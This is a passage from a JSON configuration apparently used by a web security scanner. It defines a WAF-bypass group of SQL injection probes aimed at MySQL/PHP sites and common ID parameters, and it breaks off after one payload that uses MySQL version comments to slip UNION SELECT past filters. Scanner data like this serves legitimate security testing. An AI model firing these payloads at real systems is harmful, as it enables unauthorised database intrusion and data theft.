    "waf_bypass": {
      "description": "WAF bypass SQL injection payloads \u2014 MySQL version comments, URL-encoded keywords from HackTricks",
      "tech_match": [
        "MySQL",
        "Apache",
        "PHP"
      ],
      "param_match": [
        "id",
        "uid",
        "pid",
        "num",
        "page",
        "idx",
        "index",
        "cat",
        "item_id",
        "user_id",
        "order_id"
      ],
      "probes": [
        {
          "payload": "{{baseline}}/*!50000UNION*//*!50000SELECT*/NULL-- -",
